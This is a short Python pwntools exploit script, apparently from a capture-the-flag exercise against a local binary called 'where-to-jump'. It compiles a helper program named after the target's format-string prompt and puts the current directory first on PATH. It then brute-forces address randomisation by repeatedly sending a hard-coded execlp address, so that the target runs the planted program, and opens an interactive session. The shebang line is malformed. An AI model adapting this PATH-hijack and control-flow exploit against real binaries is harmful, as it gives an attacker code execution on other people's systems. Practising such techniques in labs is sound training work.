#!usr/bin/env python
from pwn import *
import os
binary = ELF('./where-to-jump')
os.system("gcc 4.c -o 'Your choice is: %p\n'")

execlp_addr = b'0xf7da0a70'     # may need to be updated if prog
                                # doesn't work, which is found in gdb, 
                                # using the command: `print execlp`

# Brute force
# send 'execlp' addr continuously; will need to hold onto enter
for i in range(200):
  try:
    comm = process(binary.path, env = {"PATH": ".:$PATH"})
    comm.recvline()
    comm.sendline(execlp_addr)
    comm.interactive()
  except:
    pass 
